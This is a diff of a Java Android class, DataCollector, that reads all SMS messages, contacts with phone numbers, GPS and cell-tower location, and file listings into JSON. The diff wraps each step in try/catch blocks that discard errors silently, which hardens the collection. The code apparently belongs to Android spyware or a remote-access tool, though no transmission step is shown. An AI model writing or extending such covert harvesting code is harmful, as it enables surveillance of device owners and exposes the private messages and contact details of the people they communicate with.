@@ -46,11 +46,13 @@ public class DataCollector {
         Cursor c = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
         if (c != null) {
             while (c.moveToNext()) {
-                JSONObject sms = new JSONObject();
-                sms.put("address", c.getString(c.getColumnIndex("address")));
-                sms.put("body", c.getString(c.getColumnIndex("body")));
-                sms.put("date", c.getString(c.getColumnIndex("date")));
-                arr.put(sms);
+                try {
+                    JSONObject sms = new JSONObject();
+                    sms.put("address", c.getString(c.getColumnIndex("address")));
+                    sms.put("body", c.getString(c.getColumnIndex("body")));
+                    sms.put("date", c.getString(c.getColumnIndex("date")));
+                    arr.put(sms);
+                } catch (Exception e) {}
             }
             c.close();
         }
@@ -62,19 +64,21 @@ public class DataCollector {
         Cursor c = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
         if (c != null) {
             while (c.moveToNext()) {
-                String id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
-                String name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-                JSONArray phones = new JSONArray();
-                Cursor pCur = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{id}, null);
-                if (pCur != null) {
-                    while (pCur.moveToNext()) phones.put(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
-                    pCur.close();
-                }
-                JSONObject cont = new JSONObject();
-                cont.put("name", name);
-                cont.put("phones", phones);
-                arr.put(cont);
+                try {
+                    String id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
+                    String name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                    JSONArray phones = new JSONArray();
+                    Cursor pCur = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{id}, null);
+                    if (pCur != null) {
+                        while (pCur.moveToNext()) phones.put(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                        pCur.close();
+                    }
+                    JSONObject cont = new JSONObject();
+                    cont.put("name", name);
+                    cont.put("phones", phones);
+                    arr.put(cont);
+                } catch (Exception e) {}
             }
             c.close();
         }
@@ -86,12 +90,14 @@ public class DataCollector {
         Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
         if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
         JSONObject obj = new JSONObject();
-        if (loc != null) {
-            obj.put("lat", loc.getLatitude());
-            obj.put("lon", loc.getLongitude());
-        } else {
-            obj.put("error", "location not available");
-        }
+        try {
+            if (loc != null) {
+                obj.put("lat", loc.getLatitude());
+                obj.put("lon", loc.getLongitude());
+            } else {
+                obj.put("error", "location not available");
+            }
+        } catch (Exception e) {}
         return obj;
     }
 
@@ -100,8 +106,10 @@ public class DataCollector {
         JSONObject obj = new JSONObject();
         GsmCellLocation gsm = (GsmCellLocation) tm.getCellLocation();
         if (gsm != null) {
-            obj.put("cid", gsm.getCid());
-            obj.put("lac", gsm.getLac());
+            try {
+                obj.put("cid", gsm.getCid());
+                obj.put("lac", gsm.getLac());
+            } catch (Exception e) {}
         }
         return obj;
     }
@@ -113,12 +121,14 @@ public class DataCollector {
         File[] files = dir.listFiles();
         if (files != null) {
             for (File f : files) {
-                JSONObject obj = new JSONObject();
-                obj.put("name", f.getName());
-                obj.put("path", f.getAbsolutePath());
-                obj.put("dir", f.isDirectory());
-                obj.put("size", f.length());
-                arr.put(obj);
+                try {
+                    JSONObject obj = new JSONObject();
+                    obj.put("name", f.getName());
+                    obj.put("path", f.getAbsolutePath());
+                    obj.put("dir", f.isDirectory());
+                    obj.put("size", f.length());
+                    arr.put(obj);
+                } catch (Exception e) {}
             }
         }
         return arr;
